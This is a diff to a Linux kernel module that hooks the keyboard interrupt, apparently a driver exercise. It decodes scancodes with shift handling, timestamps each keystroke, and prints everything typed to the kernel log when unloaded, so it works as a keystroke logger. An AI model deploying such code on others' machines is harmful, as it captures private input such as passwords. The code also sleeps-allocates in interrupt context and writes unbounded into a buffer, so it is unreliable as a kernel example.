@@ -2,7 +2,11 @@
 #include "keymap.h"
 
 
-#define KEYBOARD_IRQ 1
+#define KEYBOARD_IRQ	1
+#define SHIFT_L		42
+#define SHIFT_R		54
+#define CAPS_LOCK	58
+
 #define BUF_SIZE PAGE_SIZE
 /*
 static struct s_stroke {
@@ -20,12 +24,30 @@ struct keyboard_map {
   char  str[25];
   int   ascii_shift;
   char  shift_str[25];
+  bool  pressed;
 };
 
 */
-struct list_head head_stroke_lst_head;
-char	line[BUF_SIZE];
+enum {
+	RELEASED,
+	PRESSED
+};
+
+struct list_head	head_stroke_lst_head;
+char			line[BUF_SIZE];
+bool 			shift = 0;
+bool 			caps_lock = 0;
+
 LIST_HEAD(head_stroke_lst);
+/*			if (first) {
+				snprintf(buffer, 80, "%i:%i:%i: ",
+					strokes->time.tm_hour,
+					strokes->time.tm_min,
+					strokes->time.tm_sec);
+				strncat(line, buffer, 80);
+				memset(buffer, 0, 80);
+				first = 0;
+			}*/
 /*
 static int	chr_open(struct inode *node, struct file *file)
 {
@@ -58,27 +80,29 @@ static irqreturn_t keyboard_handler (int irq, void *dev_id)
 	static unsigned char scancode;
 	struct s_stroke		*new;
 	struct timespec ts;
+	struct keyboard_map	*entry;
 
 	getnstimeofday(&ts);
 	new = kmalloc(sizeof(struct s_stroke), GFP_KERNEL);
 	if (new) {
 		scancode = inb (0x60);
-		memset(new->name, 0, 25);
-		memmove(new->name, keyboard_mapping[(scancode & 0x7f) - 1].str,
-			strlen(keyboard_mapping[(scancode & 0x7f) - 1].str));
-		//pr_err("new: %s\n", new->name);
-		if (scancode & 0x80)
-			new->state = 1;
-		else
-			new->state = 0;
 		new->key =  scancode & 0x7f;
-		new->value = keyboard_mapping[(scancode & 0x7f) - 1].ascii;
+		entry = &keyboard_mapping[new->key];
+		memset(new->name, 0, sizeof(new->name));
+		memcpy(new->name, entry->str, strlen(entry->str));
+		new->state = (scancode & 0x80) ? RELEASED : PRESSED;
+		entry->pressed = new->state == PRESSED ? true : false;
+		shift = keyboard_mapping[SHIFT_R].pressed | keyboard_mapping[SHIFT_L].pressed;
+		new->value = shift ? entry->shift_ascii : entry->ascii;
 		time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
 		list_add(&new->stroke_lst, &head_stroke_lst);
-	}	
+	}
 	return IRQ_HANDLED;
 }
 
+//		else if (((scancode & 0x7f) == CAPS_LOCK) && new->state == PRESSED) {
+//			caps_lock = (caps_lock == RELEASED) ? PRESSED : RELEASED;
+//		}
 static int __init keyboard_irq_init(void)
 {
 	int ret;
@@ -102,34 +126,23 @@ static int __init keyboard_irq_init(void)
 static void __exit keyboard_irq_exit(void)
 {
 	struct s_stroke		*strokes = NULL;
-//	char			*state;
 	char			buffer[80];
-	char			first = 1;
 
 	memset(buffer, 0, 80);
 	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
 	{
-		if (strokes->state) {
-			if (first) {
-				snprintf(buffer, 80, "%i:%i:%i: ",
-					strokes->time.tm_hour,
-					strokes->time.tm_min,
-					strokes->time.tm_sec);
-				strncat(line, buffer, 80);
-				memset(buffer, 0, 80);
-				first = 0;
-			}
+		if (strokes->state == PRESSED) {
 			if (isprint(strokes->value)) {
 				line[strlen(line)] = strokes->value;
 			}
 			else if (strokes->value == 13) {
 				pr_err("%s\n", line);
 				memset(line, 0, PAGE_SIZE);
-				first = 1;
 			}
 		}
 		kfree(strokes);
 	}
+	pr_err("%s\n", line);
 //	misc_deregister(&misc);
 	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
 }
